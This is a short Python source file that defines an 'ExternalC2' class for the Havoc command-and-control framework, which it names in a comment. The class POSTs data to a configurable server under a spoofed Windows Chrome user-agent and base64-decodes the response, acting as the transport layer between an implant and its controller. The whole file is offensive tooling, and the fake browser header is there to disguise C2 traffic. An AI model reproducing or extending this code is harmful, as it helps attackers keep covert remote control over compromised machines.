import base64

import requests


class ExternalC2:
    Server: str = ''

    def __init__( self, server ) -> None:
        self.Server = server
        return

    def transmit( self, data ) -> bytes:
        agent_response = b''

        try:
            # add user-agent headers to work with HavocHubO
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
            }

            response = requests.post( self.Server, data=data, headers=headers )
            agent_response = base64.b64decode(response.text)

        except Exception as e:
            print( f"[-] Exception: {e}" )

        return agent_response

